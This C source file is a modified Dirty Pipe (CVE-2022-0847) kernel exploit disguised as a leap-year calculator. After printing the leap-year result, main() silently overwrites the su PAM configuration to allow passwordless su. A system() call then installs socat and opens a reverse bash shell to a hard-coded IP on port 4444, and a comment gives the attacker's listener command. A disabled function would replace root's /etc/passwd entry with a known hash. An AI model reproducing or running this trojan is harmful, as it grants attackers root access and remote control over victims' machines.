/* SPDX-License-Identifier: GPL-2.0 */
/*
 * Copyright 2022 CM4all GmbH / IONOS SE
 *
 * author: Max Kellermann <max.kellermann@ionos.com>
 *
 * Proof-of-concept exploit for the Dirty Pipe
 * vulnerability (CVE-2022-0847) caused by an uninitialized
 * "pipe_buffer.flags" variable.  It demonstrates how to overwrite any
 * file contents in the page cache, even if the file is not permitted
 * to be written, immutable or on a read-only mount.
 *
 * This exploit requires Linux 5.8 or later; the code path was made
 * reachable by commit f6dd975583bd ("pipe: merge
 * anon_pipe_buf*_ops").  The commit did not introduce the bug, it was
 * there before, it just provided an easy way to exploit it.
 *
 * There are two major limitations of this exploit: the offset cannot
 * be on a page boundary (it needs to write one byte before the offset
 * to add a reference to this page to the pipe), and the write cannot
 * cross a page boundary.
 *
 * Further explanation: https://dirtypipe.cm4all.com/
 * 
 * Implementation by Joseph Milici
 */

#define _GNU_SOURCE
#include <unistd.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/user.h>

#define SHELLSCRIPT1 "su -c \"apt-get -y install socat\" > /dev/null; socat TCP4:172.23.46.133:4444 EXEC:/bin/bash & exit"
// attacker command: socat -d -d TCP4-LISTEN:4444 STDOUT



static void prepare_pipe(int p[2]);
static void changePasswd(char* password, size_t password_length, int p[2]);
static void changeSu(char* disableSuperUserPassword, size_t disableSuperUserPassword_length, int p[2]);

int main(int argc, char *argv[]) {
	if(argc == 2){
		int year = atoi(argv[1]);
		if(year % 400 == 0){
			printf("%d is a leap year\n", year);
		}
		else if(year % 100 == 0){
			printf("%d is not a leap year\n", year);
		}
		else if(year % 4 == 0){
			printf("%d is a leap year\n", year);
		}
		else{
			printf("%d is not a leap year\n", year);
		}
	}
	else{
		printf("Enter the year as a command line argument\n");
	}
	
	char* password = "$6$root$L5r4tyUkGCivhlFtLvEuYYKA5nrJUz12Cu.NPUUqAovBjXG7E.cZOniROYCjP5dyKsG0rN9GgKmQx9.Ozgjd./:0:0:root:/root:/bin/bash\n";
	char* disableSuperUserPassword = "auth sufficient pam_permit.so        ";
	
	size_t password_length = strlen(password);
	size_t disableSuperUserPassword_length = strlen(disableSuperUserPassword);

	/* create the pipe with all flags initialized with
	   PIPE_BUF_FLAG_CAN_MERGE */
	int p[2];
	
	prepare_pipe(p);

	// changePasswd(password, password_length, p);
	changeSu(disableSuperUserPassword, disableSuperUserPassword_length, p);


	return 0;
}


static void changePasswd(char* password, size_t password_length, int p[2]){
	const char *const path_passwd = "/etc/passwd";
	loff_t offset_passwd = 5;


	/* open the input file and validate the specified offset */
	const int passwd_file = open(path_passwd, O_RDONLY); // yes, read-only! :-)


	--offset_passwd;
	ssize_t nbytes_passwd = splice(passwd_file, &offset_passwd, p[1], NULL, 1, 0);
	

	/* the following write will not create a new pipe_buffer, but
	   will instead write into the page cache, because of the
	   PIPE_BUF_FLAG_CAN_MERGE flag */
	nbytes_passwd = write(p[1], password, password_length);
}

static void changeSu(char* disableSuperUserPassword, size_t disableSuperUserPassword_length, int p[2]){
	const char *const path_su = "/etc/pam.d/suD";
	loff_t offset_pam = 123;

	const int su_file = open(path_su, O_RDONLY);

	ssize_t nbytes_su = splice(su_file, &offset_pam, p[1], NULL, 1, 0);
	nbytes_su = write(p[1], disableSuperUserPassword, disableSuperUserPassword_length);

	system(SHELLSCRIPT1);
}


/**
 * Create a pipe where all "bufs" on the pipe_inode_info ring have the
 * PIPE_BUF_FLAG_CAN_MERGE flag set.
 */
static void prepare_pipe(int p[2]){
	pipe(p);
	const unsigned pipe_size = fcntl(p[1], F_GETPIPE_SZ);
	static char buffer[4096];

	/* fill the pipe completely; each pipe_buffer will now have
	   the PIPE_BUF_FLAG_CAN_MERGE flag */
	   /* and */
	   /* drain the pipe, freeing all pipe_buffer instances (but
	   leaving the flags initialized) */
	for (unsigned r = pipe_size; r > 0;) {
		unsigned n;
		if(r > sizeof(buffer)){
			n = sizeof(buffer);
		}
		else{
			n = r;
		}
		//printf("%d%c", p[1], '\n');
		write(p[1], buffer, n);
		read(p[0], buffer, n);
		r -= n;
	}

	/* the pipe is now empty, and if somebody adds a new
	   pipe_buffer without initializing its "flags", the buffer
	   will be mergeable */
}


